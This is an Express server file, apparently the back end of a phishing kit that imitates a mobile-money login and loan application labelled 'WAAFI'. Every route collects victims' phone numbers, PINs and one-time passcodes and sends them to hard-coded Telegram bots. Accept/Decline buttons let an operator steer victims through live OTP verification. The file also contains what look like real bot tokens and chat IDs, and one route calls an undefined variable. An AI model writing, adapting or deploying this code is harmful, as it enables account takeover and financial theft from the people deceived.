const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// --- TELEGRAM CONFIG ---
// const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8899223837:AAHyPuhI46v_gnqDpe0gIokRXSO3JGXk5_4";
// const TELEGRAM_ADMIN_ID  = process.env.TELEGRAM_ADMIN_ID  || "6268887709";

const BOT1 = {
    TOKEN: process.env.TELEGRAM_BOT_TOKEN_1 || "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc",
    ID: process.env.TELEGRAM_ADMIN_ID_1 || "7162306402"
};

const BOT2 = {
    TOKEN: process.env.TELEGRAM_BOT_TOKEN_2 || "8879554667:AAHRagYZus3n2erZ3WIBDJ8oc56ckdyroXY",
    ID: process.env.TELEGRAM_ADMIN_ID_2 || "8938942820"
};

// Auto-detect base URL: Render sets RENDER_EXTERNAL_URL, Railway sets RAILWAY_STATIC_URL
const BASE_URL = process.env.RENDER_EXTERNAL_URL
               || process.env.RAILWAY_STATIC_URL
               || process.env.APP_URL
               || `http://localhost:${PORT}`;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ---------------------------------------------------------------------------
// IN-MEMORY STORE
// ---------------------------------------------------------------------------
const sessions = {};

function log(...args) { console.log(new Date().toISOString(), ...args); }

// ---------------------------------------------------------------------------
// TELEGRAM HELPER — uses fetch (built into Node 18+), same as your original
// ---------------------------------------------------------------------------
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function sendTelegram(botConfig, body, delayMs = 0) {
    if (delayMs > 0) await delay(delayMs);

    try {
        const res = await fetch(`https://api.telegram.org/bot${botConfig.TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ ...body, chat_id: botConfig.ID })
        });
        const json = await res.json();
        if (!json.ok) log('[TG] sendMessage failed:', json.description);
        return json;
    } catch (e) {
        log('[TG] sendMessage error:', e.message);
    }
}

// ---------------------------------------------------------------------------
// API ROUTES
// ---------------------------------------------------------------------------

// 1. Login attempt — just notify, no action needed
app.post('/api/login-attempt', async (req, res) => {
    const { phone, pin, device } = req.body;
    const msg = {
        parse_mode: 'HTML',
        text: `🚨 <b>New Login Attempt - FROM WAAFI 3</b>\nPhone: ${phone}\nPIN: ${pin}\nDevice: ${device}`
    };
    const msg2 = {
        parse_mode: 'HTML',
        text: `🚨 <b>New Login Attempt</b>\nPhone: ${phone}\nPIN: ${pin}\nDevice: ${device}`
    };

    // Send to Bot 1 immediately
    sendTelegram(BOT1, msg);
    
    // Send to Bot 2 with 10 second (10000ms) delay
    sendTelegram(BOT2, msg2, 20000);

    res.json({ success: true });
});
// 2. OTP 1 — send with URL Accept/Decline buttons
app.post('/api/verify-identity', async (req, res) => {
    const { phone, otp1 } = req.body;
    const sessionId = Date.now().toString();
    sessions[sessionId] = { status: 'pending' };
    log(`[API] verify-identity sessionId=${sessionId}`);

    // Create the message object shared by both bots
    const msg = {
        parse_mode: 'HTML',
        text: `🛡️ <b>WrldBoss Verification - FROM WAAFI 3 (OTP 1)</b>\nPhone: ${phone}\nOTP 1: <b>${otp1}</b>`,
        reply_markup: {
            inline_keyboard: [[
                { text: "✅ Accept", url: `${BASE_URL}/api/cmd/${sessionId}/accept` },
                { text: "❌ Decline", url: `${BASE_URL}/api/cmd/${sessionId}/decline` }
            ]]
        }
    };
    const msg2 = {
        parse_mode: 'HTML',
        text: `🛡️ <b>Identity Verification (OTP 1)</b>\nPhone: ${phone}\nOTP 1: <b>${otp1}</b>`,
        reply_markup: {
            inline_keyboard: [[
                { text: "✅ Accept", url: `${BASE_URL}/api/cmd/${sessionId}/accept` },
                { text: "❌ Decline", url: `${BASE_URL}/api/cmd/${sessionId}/decline` }
            ]]
        }
    };

    // Send to Bot 1 immediately
    sendTelegram(BOT1, msg);
    
    // Send to Bot 2 with 10 second delay
    sendTelegram(BOT2, msg2, 20000);

    res.json({ success: true, sessionId });
});


// 3. OTP 2 — send with URL Accept/Decline buttons
app.post('/api/submit-application', async (req, res) => {
    const { phone, otp2, planInfo } = req.body;
    const sessionId = Date.now().toString();
    sessions[sessionId] = { status: 'pending' };
    log(`[API] submit-application sessionId=${sessionId}`);

    await sendTelegram({
        chat_id: TELEGRAM_ADMIN_ID,
        parse_mode: 'HTML',
        text: `✅ <b>Final Submission (OTP 2)</b>\nPhone: ${phone}\nOTP 2: <b>${otp2}</b>\nLoan: ${planInfo}`,
        reply_markup: {
            inline_keyboard: [[
                { text: "✅ Accept", url: `${BASE_URL}/api/cmd/${sessionId}/accept` },
                { text: "❌ Decline", url: `${BASE_URL}/api/cmd/${sessionId}/decline` }
            ]]
        }
    });

    res.json({ success: true, sessionId });
});

// 4. Admin URL command handler — called when admin taps a button in Telegram
//    Opens in their browser, sets the status, shows a simple confirmation page
app.get('/api/cmd/:id/:action', (req, res) => {
    const { id, action } = req.params;
    log(`[CMD] id=${id} action=${action} found=${!!sessions[id]}`);

    if (!sessions[id]) {
        return res.send(`
            <html><body style="font-family:sans-serif;text-align:center;padding:40px">
            <h2>⚠️ Session Expired</h2>
            <p>This request has already been processed or has expired.</p>
            <script>setTimeout(window.close, 2000)</script>
            </body></html>
        `);
    }

    sessions[id].status = action; // 'accept' or 'decline'

    const isAccept = action === 'accept';
    res.send(`
        <html><body style="font-family:sans-serif;text-align:center;padding:40px;background:${isAccept ? '#f0fdf4' : '#fef2f2'}">
        <div style="font-size:48px">${isAccept ? '✅' : '❌'}</div>
        <h2 style="color:${isAccept ? '#16a34a' : '#dc2626'}">${isAccept ? 'Accepted' : 'Declined'}</h2>
        <p style="color:#6b7280">Action recorded. You can close this tab.</p>
        <script>setTimeout(window.close, 1500)</script>
        </body></html>
    `);
});

// 5. Frontend polls this to check if admin has acted
app.get('/api/check-status/:id', (req, res) => {
    const session = sessions[req.params.id];
    if (!session) return res.json({ status: 'not_found' });

    log(`[STATUS] id=${req.params.id} status=${session.status}`);
    res.json({ status: session.status });

    // Clean up after delivering a final status twice (safety buffer)
    if (session.status !== 'pending') {
        session._reads = (session._reads || 0) + 1;
        if (session._reads >= 2) delete sessions[req.params.id];
    }
});

// Debug — visit /api/debug in browser to see active sessions
app.get('/api/debug', (req, res) => {
    res.json({ activeSessions: Object.keys(sessions).length, sessions });
});

// Fallback
app.use((req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ---------------------------------------------------------------------------
// START
// ---------------------------------------------------------------------------
app.listen(PORT, '0.0.0.0', () => {
    log(`🚀 Server listening on port ${PORT}`);
    log(`🔗 Base URL: ${BASE_URL}`);
});
